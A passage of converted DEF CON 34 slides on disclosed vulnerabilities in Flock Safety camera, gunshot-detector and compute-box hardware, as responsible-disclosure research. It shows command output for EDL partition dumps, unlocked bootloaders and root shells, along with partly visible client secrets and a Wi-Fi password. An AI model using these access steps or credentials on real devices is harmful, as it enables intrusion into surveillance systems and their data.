---
title: "Bird Hunting Season The Final Flight"
speakers: ["Jon Gaines"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Jon Gaines - Bird Hunting Season The Final Flight - v1.pdf"
pages: 38
sha256: "5c761d9356f3e6a7c1550d3951e1a3f0e77ac3975a26e7264d5f52ec6f3a1541"
text_chars: 47868
ocr_pages: 30
has_ocr: true
redacted_secrets: 0
ocr_confidence: 89.4
ocr_unreliable_blocks: 1
vision_verified_pages_changed: 34
vision_verified_pages: 38
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:37:47Z"
---
# Bird Hunting Season The Final Flight

**Speakers:** Jon Gaines  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Jon Gaines - Bird Hunting Season The Final Flight - v1.pdf` (38 pages)


## Slide 1

# **Bird Hunting Season**

# **Final Flight**

## Slide 2

## **Disclaimer**

**This work was conducted independently, self-funded, and outside the scope of my employment. It was performed on hardware I acquired through third-party marketplaces and tested in a controlled lab environment. Vulnerabilities/Issues went through the responsible disclosure cycle.**

**My current employer was not involved in, consulted on, or responsible for this research. No employer resources, systems, data, time or confidential information were used. Same for any previous employers.**

**The views and conclusions presented are my own and do not represent my current or former employers. I am only covering my observations; no claims regarding production deployments. The underlying technical research was completed months before this presentation. BirdShot is for authorized, educational, and defensive use. Don’t just take my word for it…**

## Slide 3

## **Who am I**

### Jon "GainSec" Gaines

- Lifelong Hacker

- Sr Security Engineer @ Anduril

- Adjunct Instructor @ Herkimer College

- Founder @ GainSec

- Dumb number of CVEs across various technologies

- Open-Source Contributor & Maintainer

- 10 years doing offensive engagements professionally

- Skateboarder

- Family man

## Slide 4

**Why This Work Exists**

## Slide 5

**What You’ll Walk Away With**

## Slide 6

## **Ecosystem: Hardware**

- Raven: audio/gunshot detection hardware

- Falcon / Sparrow: LPR and camera hardware

- Picard / Bravo: compute box and video infrastructure

- Penguin battery

- Picard battery

- Gray battery I forgot the name of

## Slide 7

**Ecosystem: Software**

#### Device Suite / Control / Other

| App / Service | Package | Version + Scope | Description |
|---|---|---|---|
| Phone Home Service | com.flocksafety.android.phonehomeservice | 6.35.23 / 6.35.35 / 7.38.5 | Device check-in and telemetry reporting service. |
| System Control | com.flocksafety.android.systemcontrol | 6.35.23 / 6.35.35 / 7.38.3 | System coordination and control service. |
| Peripheral | com.flocksafety.android.peripheral | 6.35.18 / 6.35.30 / 7.38.3 | Peripheral and hardware-control service. |
| Collins | com.flocksafety.android.collins | 6.35.23 / 6.35.31 / 7.38.3 | Local admin, live-view, and device-control service. |
| Settings Service | com.flocksafety.android.settingsservice | 6.35.18 | Device settings content provider and configuration ser *(text cut off on slide, occluded by the neighboring table)* |
| Camera Updater | com.flocksafety.android.cameraupdater | 6.35.18 | Camera update service started at boot. |
| Assembly Validator | com.flocksafety.android.validator | 6.35.18 | Validation service present as a system app/process. |
| Quality Control | com.flocksafety.android.qualitycontrol | 6.35.23 | Quality-control service present as a system app/proces *(cut off on slide)* |
| Sensor Service | com.flocksafety.android.sensorservice | 6.35.18 | Sensor service/provider used by other device apps. |
| Upload Client / St Germain | com.flocksafety.android.uploadclient | 6.35.23 | Upload-client service present as a system app/process. |
| WifiHotSpot | com.flocksafety.android.wifiAp | 8.1.0 / code 27 | Hotspot/local network component relevant to wireless access behavior. |
| Flock System Test | com.flocksafety.android.systemtest | installed path / version not confirmed | System test app observed running as UID 1000 and wri *(cut off)* / logs. |
| Sambuca | com.flocksafety.android.sambuca | 6.35.18 / 6.35.35 | Provisioning/auth-related system APK. |
| Pisco | com.flocksafety.android.pisco | 6.21.11 | Device-suite app tied to the hardcoded Auth0 client-se *(cut off)* / finding. |
| WhistlePig | com.flocksafety.android.whistlepig | 7.72.2 | Picard/Bravo audio app/service. |

#### Video / Vision / Media + Public Apps

| App / Service | Package | Version + Scope | Description |
|---|---|---|---|
| Objects / DetectionProcessing | com.flocksafety.android.objects | 6.35.23 / 6.35.33 / 7.38.3 | Object and visual detection processing app. |
| Ciroc | com.flocksafety.android.ciroc | 6.35.23 / 6.35.34 | Core vision and orchestration daemon. |
| Cachaca / Burst Cam | com.flocksafety.android.cachaca | 6.35.23 / 6.35.31 | Burst/capture camera app. |
| Motion | com.flocksafety.android.motion | 6.35.23 / 7.38.3 | Motion-processing stage in the recording pipeline. |
| Encoding | com.flocksafety.android.encoding | 6.35.23 / 7.38.3 | Media encoding and upload-staging service. |
| Video Recording | com.flocksafety.android.videorecording | 7.38.3 | Camera capture and recording service. |
| Video Streaming | com.flocksafety.android.streaming | 7.38.3 | RTSP/RTP video streaming service. |
| Camera Config | com.flocksafety.android.cameraconfig | 7.38.5 | Camera configuration and admin UI app. |
| Medalla Light | com.flocksafety.android.medallalight | 6.35.23 | Device media/light-related service present as a system app/process. |
| Amarula | com.flocksafety.android.amarula | 6.35.23 / 6.35.31 | In-scope system APK with media/database-adjacent indicators. |
| Big Boi Bud | com.flocksafety.android.bigboibud | 6.35.23 / 6.35.31 | In-scope system APK; role not fully confirmed in current notes. |
| FlockCamera | com.flock.camera | 8.1.0 / code 27 | Camera package observed on Falcon devices. |
| FSInstaller | com.flocksafety.hazyhiwire | 2.4.0 | Installer and device activation app. |
| Flock Safety | com.flocksafety.sweetwater | 1.49.1 / 1.48.0 | Public/mobile Flock Safety app. |
| Flock On Patrol | com.flocksafety.android.negroni | 1.2.0 | Patrol and plate-lookup app. |

## Slide 8

**Bird Hunting Season: Timeline**

Timeline lanes (Jan - DEF CON): Research, Vendor/CVE, Disclosure, Flock response, Feeds arc, Release. Legend: Research, Vendor/CVE, Public disclosure, Flock response, Exposed feeds, Release.

**1-7: acquisition to first public release**

1. 2025-01 — Acquired first Flock hardware
2. 2025-02-08 — Initial vendor contact
3. 2025-02-10 — Vendor response
4. 2025-03-07 — Vendor CVE request for initial set
5. 2025-05-05 — Flock PR article about the vulnerabilities
6. 2025-06-19 — Part 1 public disclosure
7. 2025-06-19 — Further vulnerabilities disclosed to Flock

**8-14: CVE batch to wireless/local**

8. 2025-06-27 — First CVE batch published
9. 2025-06-27 — Follow-up deadline provided
10. 2025-06-27 — Flock confirmed validation/triage in progress
11. 2025-06-27 — Further vulnerabilities disclosed to Flock
12. 2025-09-03 — Flock said existing CVEs applied; researcher disputed scope
13. 2025-09-19 — Compute box disclosure
14. 2025-09-27 — Wireless/local admin disclosure

**15-21: Part 4 to CEO response**

15. 2025-10-23 — Further vulnerabilities disclosed to vendor, Part 4
16. 2025-11-05 — Whitepaper v1 public release
17. 2025-11-05-ish — First major YouTube visibility; whitepaper released to land with the video
18. 2025-11-06 — Flock whitepaper PR statement / public response
19. 2025-11-11 — Whitepaper v1.2 public release with 51 findings
20. 2025-11-11 — Further vulnerabilities disclosed to vendor, Part 5
21. 2025-12-08 — CEO LinkedIn security posture response

**22-28: feeds arc to DEF CON**

22. 2026-01-ish — Benn/404 lead of 4 exposed feeds expanded to 67 total
23. 2025-12-23 — Flock Condor configuration issue statement
24. 2026-01-06 — Flock "Has Flock Been Hacked?" response
25. 2026-01-09 — Exposed camera feed/debug interface write-up
26. 2026-01-23 — Full Disclosure Part 4
27. 2026-02-11 — Full Disclosure Part 5
28. DEF CON 2026 — Final Flight + BirdShot release

## Slide 9

**The Usual Suspects**

| Failure class | What it means | Where it shows up | Issue IDs |
|---|---|---|---|
| Boot / Root Of Trust | Secure boot, bootloader, flash/eMMC/UFS encryption, EDL/QDL, anti-rollback. | Raven efuse/firmware evidence; Falcon/Sparrow fastboot/EDL; Picard/Bravo boot state. | 1, 5, 8, 13-15, 18, 22-24, 27 |
| Debug / Maintenance Access | Debug features or maintenance paths that changed the access level or impact. | UART/JTAG, ADB, sideload, JDWP/debuggable apps, debug broadcasts, data-log cleanup. | 2, 3, 6, 7, 16, 17, 25, 26, 34, 35, 38 |
| Secrets / Configs / Credentials | Client material, static credentials, provisioning values, API keys, keystores, and app secrets exposed in artifacts. | Raven NVS/config; Falcon/Picard Android apps; public apps; FS Installer assets. | 4, 10, 20, 37, 40, 43, 46, 48-50, S1 |
| Local Services / Admin Control | Local service reachability became administrative capability, shell, or system command execution. | Collins/admin APIs, local wireless position, ADB-over-TCP, public-app RCE framing. | 28-30, 33, 41, 51 |
| Media / Evidence Handling | Recorded media, replay paths, retention, directories, and encryption boundaries behaved like ordinary files or services. | Recording directories, shared media library, per-file encryption, retention, external partitions. | 31, 32, 36, 39, 44, 45 |
| ML / Model Exposure | Audio/visual model assets and inference outputs were reachable or extractable enough to analyze/replay. | Raven audio classifier; Android visual model stack; BirdEye/model replay context. | 9, 42 |
| Network / Tunnel Boundaries | Network placement, cleartext paths, local wireless, and FRP/tunnel behavior weakened service boundaries. | DNS spoofing, cleartext comms, SpeedPourer/FRP, video/control fallback path. | 11, 47, S2-S4 |
| Unsupported / Production Build Posture | Deployed software/build posture created risk independent of a single exploit chain. | Unsupported Android 8.1; production apps with debug behavior; broad privileged app suite. | 19, 35 |

## Slide 10

## **Raven: Plucked And Rooted**

1. **Hardware on the bench** — photo of the opened Raven module on a workbench; portions of the photo are blacked out. No legible text.

2. **Boot logs**

```text
I (27) boot: chip revision: 1
I (31) boot_comm: chip revision: 1, min. bootloader chip revision: 0
I (38) boot.esp32: SPI Speed      : 40MHz
I (43) boot.esp32: SPI Mode       : DIO
I (47) boot.esp32: SPI Flash Size : 16MB
I (52) boot: Enabling RNG early entropy source...
I (57) boot: Partition Table:
I (61) boot: ## Label            Usage          Type ST Offset   Length
I (68) boot:  0 nvs              WiFi data        01 02 00009000 00004000
I (76) boot:  1 otadata          OTA data         01 00 0000d000 00002000
I (83) boot:  2 phy_init         RF data          01 01 0000f000 00001000
I (91) boot:  3 ota_0            OTA app          00 10 00010000 00400000
I (98) boot:  4 ota_1            OTA app          00 11 00410000 00400000
I (106) boot:  5 storage          Unknown data     01 81 00810000 00150000
I (113) boot: End of partition table
I (118) boot_comm: chip revision: 1, min. application chip revision: 0
I (125) esp_image: segment 0: paddr=00010020 vaddr=3f400020 size=93260h (602720) map
I (351) esp_image: segment 1: paddr=000a3288 vaddr=3ffbdb60 size=08564h ( 34148) load
I (365) esp_image: segment 2: paddr=000ab7f4 vaddr=40080000 size=04024h ( 16420) load
I (373) esp_image: segment 3: paddr=000b0020 vaddr=400d0020 size=117a18h (1145368) map
I (787) esp_image: segment 4: paddr=001c7a40 vaddr=40084824 size=1a8d8h (108760) load
I (832) esp_image: segment 5: paddr=001e2320 vaddr=400c0000 size=00068h (   104)
I (832) esp_image: segment 6: paddr=001e2390 vaddr=50000000 size=00020h (    32)
I (853) boot: Loaded app from partition at offset 0x10000
I (853) boot: Disabling RNG early entropy source...
I (865) psram: This chip is ESP32-D0WD
I (866) spiram: Found 64MBit SPI RAM device
```

3. **ESP eFuse summary**

```text
PS C:\Users\numbuh1337\Desktop\Projects\CVE\FlockSafety\Raven-Gunshot> python -m espefuse --port COM13 summary
espefuse.py v4.7.0
Connecting...
Detecting chip type... Unsupported detection protocol, switching and trying again...
Connecting...
Detecting chip type... ESP32

=== Run "summary" command ===
EFUSE_NAME (Block) Description = [Meaningful Value] [Readable/Writeable] (Hex Value)
----------------------------------------------------------------------------------------
Calibration fuses:
ADC_VREF (BLOCK0)            True ADC reference voltage                                        = 1100 R/W (0b10000)

Config fuses:
WR_DIS (BLOCK0)               Efuse write disable mask                                          = 0 R/W (0x0000)
RD_DIS (BLOCK0)               Disable reading from BLOCK1-3                                     = 0 R/W (0x0)
DISABLE_APP_CPU (BLOCK0)      Disables APP CPU                                                  = False R/W (0b0)
DISABLE_BT (BLOCK0)           Disables Bluetooth                                                = False R/W (0b0)
DIS_CACHE (BLOCK0)            Disables cache                                                    = False R/W (0b0)
CHIP_CPU_FREQ_LOW (BLOCK0)    If set alongside EFUSE_RD_CHIP_CPU_FREQ_RATED; the ESP32's max     = False R/W (0b0)
                               CPU frequency is rated for 160MHz. 248MHz otherwise
CHIP_CPU_FREQ_RATED (BLOCK0)  If set; the ESP32's maximum CPU frequency has been rated           = True R/W (0b1)
BLK3_PART_RESERVE (BLOCK0)    BLOCK3 partially served for ADC calibration data                   = False R/W (0b0)
CLK8M_FREQ (BLOCK0)           8MHz clock freq override                                           = 59 R/W (0x3b)
VOL_LEVEL_HP_INV (BLOCK0)     This field stores the voltage level for CPU to run at 240 MHz; or   = 0 R/W (0b00)
                               for flash/PSRAM to run at 80 MHz.0x0: level 7; 0x1: level 6;
                               0x2: level 5; 0x3: level 4. (RO)
```
(panel is cut off at this point at the bottom edge of the slide)

4. **NVS config**

| key | type | encoding | value |
|---|---|---|---|
| # NVS csv file | | | |
| raven_nvs | namespace | | |
| isRegistered | data | u8 | 1 |
| clientId | data | string | xvtgsytnYyrs7pk88 *(cut off at panel edge)* |
| clientSecret | data | string | BcyZHlz-D49AqQs *(cut off at panel edge)* |
| serialNumber | data | string | 240821702E3 |
| partNumber | data | string | 703-00006 |
| consoleLogEn | data | u8 | 0 |
| misc | namespace | | |
| nvs.net80211 | namespace | | |
| ap.sndchan | data | u8 | 1 *(row cut off at bottom of panel)* |

5. **Debug shell menu**

```text
raven> help
test
  Enter test console mode

end_test
  Exit test console mode

query
  Query device status

disable_console
  Disable test console in NVS

gps_config
  Run GPS config test

gps_func
```
(cut off at bottom edge of panel)

6. **Wi-Fi fallback strings**

```text
nigel@SectorBG:~/esp32knife/blob_data$ strings sta.apinfo.bin
Flock
security
35|[
Flock-230503
security
s>:pW
Flock
Ay4TwnB43fmx
```

## Slide 11

**Raven: Takeaway**

| Issue | CVE |
|---|---|
| Flash encryption disabled | CVE-2025-47820 |
| Secure boot disabled | CVE-2025-47819 |
| JTAG enabled | CVE-2025-47819 |
| UART download mode enabled | CVE-2025-47819 |
| No anti-rollback protection | No separate CVE / N/A |
| Hardcoded Wi-Fi SSID/password in firmware/NVS | CVE-2025-47818 |
| Device auto-connects to matching Wi-Fi when LTE/modem unavailable | Related to CVE-2025-47818 |
| Cleartext API client ID/client secret in NVS | CVE-2025-47821 |
| NVS modification enables UART console / debug shell | CVE-2025-47819 |
| UART console has no password once enabled | CVE-2025-47819 |
| Firmware readable with standard ESP32 tooling | Covered by CVE-2025-47820 |
| Debug/console strings and operational config exposed in firmware | No separate CVE |
| Cloud/API endpoint and provisioning material exposed in firmware/config | No separate CVE |
| Audio event detection model / classifier pipeline exposed | No separate CVE |
| Lack of server verification / DNS spoofing path | No separate CVE |

## Slide 12

**Falcon / Sparrow: Grounded Flight**

1. **Carrier boards / SoM** — photo of two carrier boards/SoM modules on a workbench. No legible text.

2. **Fastboot posture**

```text
┌──(root㉿kali)-[/home/kali]
└─# fastboot devices
3130B1207252201377      fastboot

┌──(root㉿kali)-[/home/kali]
└─# fastboot getvar all

(bootloader) version:0.5
(bootloader) battery-soc-ok:yes
(bootloader) battery-voltage:3933000
(bootloader) variant:Dragon eMMC
(bootloader) unlocked:yes
(bootloader) secure:no
(bootloader) version-baseband:
```
(cut off at bottom edge of panel)

3. **EDL / Firehose**

```text
┌──(root㉿SectorTL)-[/home/nigel/edl]
└─# ./edl printgpt --loader=ALPR-DDR-FIREHOUSE.mbn
Qualcomm Sahara / Firehose Client V3.62 (c) B.Kerler 2018-2024.
main - Using loader ALPR-DDR-FIREHOUSE.mbn ...
main - Waiting for the device
main - Device detected :)
sahara - Protocol version: 2, Version supported: 1
main - Mode detected: sahara
sahara -
Version 0x2
------------------------
HWID:          0x000660e100000000 (MSM_ID:0x000660e1,OEM_ID:0x0000,MODEL_ID:0x0000)
CPU detected:  "APQ8053"
PK_HASH:       0xcc3153a80293939b90d02d3bf8b23e0292e452fef662c74998421adad42a380f
Serial:        0x53becbce

sahara - Protocol version: 2, Version supported: 1
sahara - Uploading loader ALPR-DDR-FIREHOUSE.mbn ...
sahara - 32-Bit mode detected.
sahara - Firehose mode detected, uploading...
sahara - Loader successfully uploaded.
main - Trying to connect to firehose loader ...
```

4. **Read boot partition**

```text
┌──(root㉿SectorTL)-[/home/nigel/edl]
└─# ./edl r boot /home/nigel/ALPR-Final/boot.img --loader=ALPR-DDR-FIREHOUSE.mbn
Qualcomm Sahara / Firehose Client V3.62 (c) B.Kerler 2018-2024.
main - Using loader ALPR-DDR-FIREHOUSE.mbn ...
main - Waiting for the device
main - Device detected :)
main - Mode detected: firehose
Progress: |          | 100.0% Read (Sector 0x10000 of 0x10000, ) 30.17 MB/s
Dumped sector 790528 with sector count 65536 as /home/nigel/ALPR-Final/boot.img.

┌──(root㉿SectorTL)-[/home/nigel/edl]
└─# ./edl reset --loader=ALPR-DDR-FIREHOUSE.mbn
Qualcomm Sahara / Firehose Client V3.62 (c) B.Kerler 2018-2024.
main - Using loader ALPR-DDR-FIREHOUSE.mbn ...
main - Waiting for the device
main - Device detected :)
main - Mode detected: firehose
DeviceClass - USBError(19, 'No such device (it may have been disconnected)')
```

5. **Root shell**

```text
msm8953_32:/ $ sh
msm8953_32:/ $ su
msm8953_32:/ # whoami
root
msm8953_32:/ # whoami
root
```
(top edge of the panel is cut off; a partial line is visible but not legible)

6. **Camera feed running** — a code editor showing live QCamera/mm-camera logcat output (frame timestamps, capture callbacks, JPEG encode latency) next to a browser preview window streaming video from a local address. The text is too small to transcribe reliably even at maximum zoom.

## Slide 13

**Falcon / Sparrow: Takeaway**

| Issue | CVE |
|---|---|
| Root shell | No |
| Secure boot disabled | CVE-2025-47822 |
| Unlocked bootloader | CVE-2025-47822 |
| Unauthenticated EDL/QDL mode | CVE-2025-47822 |
| Unauthenticated ADB shell access | No |
| ADB sideload allowed | No |
| No flash/eMMC encryption | CVE-2025-47824 |
| Unsupported Android 8.1 embedded OS | No |
| Development/test Wi-Fi credential in production | CVE-2025-59409 |
| Hidden hotspot/default-password debug path | No |
| Unauthenticated Collins administrative API | CVE-2025-59403 |
| Wireless RCE to shell via Collins / ADB-over-TCP | CVE-2025-59403 |
| Wireless RCE to system via Collins + debug chain | No |
| Wireless RCE to root via Collins + data-log cleanup | No |

| Issue | CVE |
|---|---|
| Privileged Android apps shipped debuggable | No |
| Unauth debug broadcast clears settings/shuts off device | No |
| Root command injection via data-log cleanup | No |
| Cleartext API keys / credentials | CVE-2025-47823 |
| Hardcoded Java keystore and password | CVE-2025-59407 |
| Hardcoded Auth0 secret | CVE-2025-59406 |
| Hardcoded Datadog API token | CVE-2025-59405 |
| Incorrect permissions on media recording directories | No |
| Shared media library allows cross-app data exposure | No |
| Lack of per-file encryption on sensitive media | No |
| Excessive sensitive media copies persist on disk | No |
| Cleartext AI/ML local inference modules exposed | No |
| Data recording retention relies solely on disk capacity | No |
| Records stored on unencrypted external partition | No |

## Slide 14

**Check in**

Products Solutions Privacy & Security Resources Company

### How Data Transmission from Flock Sensors Work In Practice

Flock’s LPR camera and gunshot detection system is made up of individual sensors connected to each other and to the cloud through cellular networks. LPR cameras record still images of vehicles when triggered by motion. When a gunshot, firework, or audio event indicative of a sideshow stunt (like sustained tires screeching) is detected, our gunshot detection devices record a three-second audio clip to be preserved as evidence. Images, audio and associated metadata are encrypted and transmitted to the cloud through Transport Layer Security (TLS) encryption. The data is then stored encrypted in the cloud for 30 days so it can be accessed if it needs to be used as evidence in a case. On the device, images and audio are regularly deleted. The gunshot detection device cannot hold more than 50 seconds of audio.

### Ongoing Security Reinforcements

Flock’s security team was recently alerted about limited, localized security vulnerabilities on our license plate readers and gunshot detection devices. As responsible stewards of customer data, upon notification we analyzed the impact of these vulnerabilities and subsequently have made the following submissions to Mitre for inclusion in the National Vulnerability Database.

- Debug interface enabled (CWE-1191)
- Hardcoded credentials (CWE-798, CWE-259)
- Hardcoded connection details (CWE-798, CWE-259)
- Clear Text Storage of Code (CWE-312)

These are not material vulnerabilities, and both severity and likelihood to be exploited are low. The exploitation of these vulnerabilities require physical access to a device and knowledge of device debugging. If a person was able to gain physical access to the device (which is typically placed on a pole several feet above normal height), they would still not be able to gain access to footage, as the data is only stored for a very limited time duration on the device following its transmission to the cloud.

None of these vulnerabilities affect our cloud platform, where the vast majority of all evidence and metadata is stored. Flock secures data in accordance with industry requirements, including encryption using AES-256, as validated by the company’s ISO 27001 compliance certification.

### CVE-2025-47822 Detail

**Description**

Flock Safety LPR (License Plate Reader) devices with firmware through 2.2 have an on-chip debug interface with improper access control.

## Slide 15

**Picard / Bravo Compute Box: Root from the Coop**

1. **Compute box hardware** — photo of the Picard/Bravo compute box hardware, opened and on a workbench (two photos). No legible text.

2. **Secure boot off / UFS**

```text
┌──(root㉿SectorTL)-[/home/nigel]
└─# minicom -D /dev/ttyUSB0 -b 115200

Welcome to minicom 2.10

OPTIONS: I18n
Port /dev/ttyUSB0, 03:10:53 [U]

Press CTRL-A Z for help on special keys

Format: Log Type - Time(microsec) - Message - Optional Info
Log Type: B - Since Boot(Power On Reset), D - Delta, S - Statistic
S - QC_IMAGE_VERSION_STRING=BOOT.MXF.1.0-00946.1-LAHAINA-1
S - IMAGE_VARIANT_STRING=SocKodiakLAA
S - OEM_IMAGE_VERSION_STRING=4c1b8341de57
S - Boot Interface: UFS
S - Secure Boot: Off
```

3. **EDL / Firehose read**

```text
└─# ./edl --loader=prog_firehose_ddr.elf r userdata userdata.img
Qualcomm Sahara / Firehose Client V3.62 (c) B.Kerler 2018-2024.
main - Using loader prog_firehose_ddr.elf ...
main - Waiting for the device
main - Device detected :)
main - Mode detected: firehose
Progress: |          | 100.0% Read (Sector 0x93FB00 of 0x948DD3, ) 38.90 MB/s
Progress: |          | 100.0% Read (Sector 0x93FC00 of 0x948DD3, ) 40.65 MB/s
Progress: |          | 100.0% Read (Sector 0x93FD00 of 0x948DD3, ) 36.44 MB/s
Progress: |          | 100.0% Read (Sector 0x93FE00 of 0x948DD3, ) 40.93 MB/s
Progress: |          | 100.0% Read (Sector 0x93FF00 of 0x948DD3, ) 36.93 MB/s
Progress: |          | 100.0% Read (Sector 0x940000 of 0x948DD3, ) 40.93 MB/s
Progress: |          | 100.0% Read (Sector 0x940100 of 0x948DD3, ) 36.75 MB/s
Progress: |          | 100.0% Read (Sector 0x940200 of 0x948DD3, ) 40.97 MB/s
Progress: |          | 100.0% Read (Sector 0x940300 of 0x948DD3, ) 36.08 MB/s
Progress: |          | 100.0% Read (Sector 0x940400 of 0x948DD3, ) 40.72 MB/s
Progress: |          | 100.0% Read (Sector 0x940500 of 0x948DD3, ) 35.95 MB/s
Progress: |          | 100.0% Read (Sector 0x940600 of 0x948DD3, ) 39.87 MB/s
Progress: |          | 100.0% Read (Sector 0x940700 of 0x948DD3, ) 38.52 MB/s
Progress: |          | 100.0% Read (Sector 0x940800 of 0x948DD3, ) 42.66 MB/s
```
(cut off at bottom edge of panel)

4. **Fastboot reports unlocked**

```text
└─# fastboot getvar all
(bootloader) parallel-download-flash:yes
(bootloader) hw-revision:10000
(bootloader) unlocked:yes
(bootloader) off-mode-charge:0
(bootloader) charger-screen-enabled:0
(bootloader) battery-soc-ok:yes
(bootloader) erase-block-size: 0x1000
(bootloader) logical-block-size: 0x1000
(bootloader) variant:QCS UFS
```

5. **Vendor shell context**

```text
BRAVO:/ $ runcon u:r:vendor_shell:s0 /system/bin/sh
runcon: Could not set context to u:r:vendor_shell:s0: Permission denied
1|BRAVO:/ $ /vendor/bin/sh
BRAVO:/ $ id -Z
u:r:vendor_shell:s0
BRAVO:/ $
```

6. **Root proof**

```text
┌──(root㉿SectorTL)-[/mnt/SECOND/Compute-Box-2-POSTROOT]
└─# adb shell whoami
root
```

## Slide 16

**Picard / Bravo Compute Box: Takeaways**

| Issue | CVE |
|---|---|
| Root shell on Picard/Bravo Compute Box | No |
| Secure boot disabled | CVE-2025-59408 |
| Unlocked bootloader | CVE-2025-59404 |
| Unauthenticated EDL/QDL mode | CVE-2025-59402 |
| Unauthenticated ADB shell access | No |
| ADB sideload allowed | No |
| No flash/UFS encryption | No |
| Hidden hotspot/default-password debug path | No |
| Unauthenticated Collins administrative API | CVE-2025-59403 |
| Wireless RCE to shell via Collins / ADB-over-TCP | CVE-2025-59403 |
| Wireless RCE to system via Collins + debug chain | No |
| Wireless RCE to root via Collins + data-log cleanup | No |
| Privileged Android apps shipped debuggable | No |
| Unauth debug broadcast clears settings and shuts off device | No |
| Root command injection via data-log cleanup | No |

| Issue | CVE |
|---|---|
| Cleartext API keys / credentials | CVE-2025-47823 |
| Hardcoded Java keystore and password | CVE-2025-59407 |
| Hardcoded Auth0 secret | CVE-2025-59406 |
| Hardcoded Datadog API token | CVE-2025-59405 |
| Incorrect permissions on media recording directories | No |
| Shared media library allows cross-app data exposure | No |
| Lack of per-file encryption on sensitive media | No |
| Excessive sensitive media copies persist on disk | No |
| Cleartext AI/ML local inference modules exposed | No |
| Data recording retention relies solely on disk capacity | No |
| Records stored on unencrypted external partition | No |
| SpeedPourer/FRP cleartext video/control fallback path | No |
| SpeedPourer/FRP config permission/control issue | No |
| SpeedPourer/FRP reverse-proxy/admin exposure | No |

## Slide 17

**Public Apps: Takeaways**

| App | Issue | CVE |
|---|---|---|
| FS Installer<br>com.flocksafety.hazyhiwire | **Cleartext device-control channel**<br>Global cleartext traffic plus hardcoded HTTP device-control URLs for activation, local control, and OTA-style workflows. | No |
| FS Installer<br>com.flocksafety.hazyhiwire | **Sensitive operational artifact disclosure**<br>Bundled Raven BLE configuration map, Penguin firmware/bootloader ZIPs, local service URLs, device workflow strings, and field-task logic. | No |
| Flock On Patrol<br>com.flocksafety.android.negroni | **Authorization tokens logged to Logcat**<br>Release networking stack configured OkHttp BODY logging for plate lookup calls, exposing headers and response bodies to adb logcat. | No |

## Slide 18

**Before The Feed Exposure**

ORIGINAL RESEARCH, ANALYSIS, DISCLOSURES AND AUTHORED BY JON "GAINSEC" GAINES*

*Contribution from Joseph "JosephRC" Cohen

*Examining the security posture of an Anti-Crime Ecosystem*

Version: 1.2-PR

November 11, 2025

Flock | Products Solutions Privacy & Security Resources Company

On November 5th, 2025 an independent security researcher published a
white paper compiling previously published security findings about Flock
hardware and software. The scope of the security research included:

- Audio Detection hardware
- License Plate Recognition (LPR)
- Compute Box
- Android applications deployed on those devices
- Android applications available on public app stores.

The researcher has been in contact with Flock Safety throughout the course of their
work and notified Flock of findings earlier in 2025. In response, Flock posted a customer
advisory addressing the researcher's findings with respect to our Audio and LPR
devices; Flock registered the vulnerabilities with the National Vulnerability CVE database
via Mitre. Since then, Flock continues to transparently and publicly report findings.

As our customers have come to expect, Flock continues to prioritize their
security by continuously evaluating the security of devices and resolving
vulnerabilities in accordance with potential risk to customer environments.

The white paper released on November 5th confirms the reported findings that have been
previously publicly disclosed; those that have been reported otherwise are under review by MITRE.

**Overall, none of the vulnerabilities detailed in the report have an impact on our customers' ability
to carry out their public safety objectives.** Exploitation of these vulnerabilities would not only
require physical access to a device, but also require intimate knowledge of internal device hardware.

YouTube thumbnail: "HACKING 80,000+ POLICE CAMERAS" (three men standing in a field in front of solar-powered camera poles, one face blurred), duration 43:45. Title: "We Hacked Flock Safety Cameras in under 30 Seconds." — 2M views • 7 months ago.

## Slide 19

**Video Stack Overview: Architecture**

### Older Collins Path
LPR local admin API triggers MJPEG live view.

- **Falcon / Sparrow LPR** — Android-based LPR device with camera pipeline and local services.
- ↓
- **Collins App** (com.flocksafety.android.collins) → **Admin API** — Local API surface on port 8080. Live view, device status, crashpack, reboot, ADB toggles.
- ↓
- **LiveView Enable** — API flips stream state and returns live view metadata. → **MJPEG Server** — Local image stream, commonly observed around port 1234.
- ↓
- **Viewer / Proxy / Local Client** — Feed can be viewed by a local client or bridged during lab testing. The boundary is local network access, not user authentication.

Failure pattern: local network reachability was treated like authorization.

### Newer CameraConfig / Streaming Stack
Camera admin UI, RTSP replay/live streams, ONVIF, and FRP exposure paths.

- **Camera Device / Compute Stack** — Ciroc orchestrates capture, recording, streaming, status, and config services.
- ↓
- **CameraConfig** — Admin web portal, video listings, config, diagnostics. | **Streaming** — RTSP live/replay via video streaming components. | **SpeedPourer** — FRP and port forwarding around local camera services.
- ↓
- **HTTP Admin** — videoAdmin, getVideo, deleteVideo, logs, diagnostics. | **RTSP / HLS** — Live and replay streams tied to camera IDs and ports. | **ONVIF / Camera API** — Device, media, PTZ, analytics, events surfaces.
- Admin portal exposed video listing, diagnostics, replay, logs, and deletion controls. | SpeedPourer/FRP could bridge internal services across network boundaries.
- RTSP/HLS paths turned local camera services into direct feed access. | ONVIF expanded the surface beyond simple video playback.

Failure pattern: service composition turned camera operations into an exposure surface.

## Slide 20

**ML Stack Overview**

### Raven Gunshot Detection
Embedded audio event classifier on an ESP32 + Syntiant NDP120 path.

- **Microphone / Audio Input** — Device captures surrounding audio after wake or event trigger. → **ESP32 Firmware** — Project name observed as `audio_event_detection`.
- ↓
- **NDP120 ML Chip** — Runtime logs identify NDP120-B0 and load MCU/DSP firmware. → **Audio Preprocessing** — WAV stats, normalization, sample frames, and tank size visible in logs.
- ↓
- **gunshot** (raw NN0 label) → **tire** (raw NN0 label) → **background** (raw NN0 label)
- ↓
- **Event Tag + Audio Upload Decision** — Logs show matching class, confidence values, "mark this data as ML data," and follow-on audio handling.

Confirmed: classifier labels and runtime behavior were visible. | Evidence: UART/debug logs, firmware strings, NDP config output.

Raw labels observed: gunshot, tire, background.

### Falcon / Sparrow / Bravo / Picard
Android visual recognition stack with extractable model assets and replay tooling.

- **Camera Capture** — Cachaca / Ciroc camera path creates media sessions and captured frames. → **Media Pipeline** — Stages include captured, motionProcessed, detectionProcessed, encoded.
- ↓
- **DetectionProcessing** — com.flocksafety.android.objects runs SessionFilter / nativeML. → **TFLite Model Assets** — YOLO / SSD models, labels, anchors, and metadata in flock-object assets.
- ↓
